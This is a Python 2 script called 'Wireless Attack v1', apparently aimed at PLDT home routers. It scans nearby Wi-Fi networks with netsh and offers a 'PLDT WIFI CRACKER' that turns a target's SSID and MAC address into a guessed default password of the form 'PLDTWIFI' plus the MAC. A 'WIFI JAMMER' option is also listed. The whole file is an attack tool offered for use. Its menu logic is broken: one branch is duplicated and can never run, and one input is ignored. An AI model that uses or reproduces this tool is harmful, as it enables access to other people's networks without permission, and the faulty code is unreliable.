from __future__ import print_function
from colorama import init, Fore
init()
#COLOR
#Fore.RED
#Fore.GREEN
#Fore.YELLOW
#Fore.RESET
#Fore.MAGENTA
#Fore.CYAN
import os,sys,time
os.system("cls")
def banner(): 
    print ('')
    print (Fore.GREEN + "  .;'                     `;,    ")
    print (Fore.GREEN + " .;'  ,;'             `;,  `;,   " + Fore.RESET + "Wireless Attack v1 ")
    print (Fore.GREEN + ".;'  ,;'  ,;'     `;,  `;,  `;,  ")
    print (Fore.GREEN + "::   ::   :   " + Fore.RESET + "( )" + Fore.GREEN + "   :   ::   ::  " + Fore.RESET + "automated wireless auditor")
    print (Fore.GREEN + "':.  ':.  ':. " + Fore.RESET + "/_\\" + Fore.GREEN + " ,:'  ,:'  ,:'  ")
    print (Fore.GREEN + " ':.  ':.    " + Fore.RESET + "/___\\" + Fore.GREEN + "    ,:'  ,:'   " + Fore.RESET + "designed for Windows")
    print (Fore.GREEN + "  ':.       " + Fore.RESET + "/_____\\" + Fore.GREEN + "      ,:'     ")
    print (Fore.GREEN + "           " + Fore.RESET + "/       \\" + Fore.GREEN + "             ")
    print (Fore.RESET)
banner()
def scan():
    print ("\n\n [+] scanning for wireless devices...")
    os.system("netsh wlan show networks mode=Bssid")
scan()
def select():
    print (" 1) PLDT WIFI CRACKER")
    print (" 2) WIFI JAMMER")
    print (" 3) Back\n\n")
    s = raw_input(" Enter your choice: ")
    if s == "2":
        print ("not finish yet")
    elif s == "1":
        os.system("cls")
        banner()
        print ("\n\n Select PLDT Type\n")
        print (" 1) PLDTHOMEDSL")
        print (' 2) About')
        print (' 3) Back')
        print (' 4) Exit')
        s = raw_input("\n Select 1-3 PLDT Type: ")
        ssid = raw_input(" Enter Target PLDT Wifi Name: ")
        mac = raw_input(" Enter the full mac address: ")
        print ("-" * 60)
        print ('SSID:' + ssid)
            
        print ("Password:PLDTWIFI" + mac)
        print ('-' * 60)
        e = raw_input("\n Do you want to go in Main menu? [Y/n] ")
        if e == 'Y' or e == 'y' or e == 'yes' or e == 'YES':
            os.system('cls')
            banner()
            select()
        elif e == 'N' or e == 'n' or e == 'no' or e == 'NO' or e == 'No' or e == 'nO':
            exit()
        else:
            print (' Invalid command!')
    elif s == '2':
        print (' PLDT WIFI PASSWORD CRACKER\n Created by: Edmark Jay Sumampen')
        time.sleep(4.0)
        os.system('cls')
        banner()
        select()
    elif s == '3':
        os.system("fc.py")
    elif s == '4':
        print (' Thanks for using my Program\n Bye Bye')
        time.sleep(3)
        os.system('cls')
        exit()
    else:
        print (' Invalid Command')
        time.sleep(3)
        os.system('cls')
        banner()
        select()

                
	
select()

























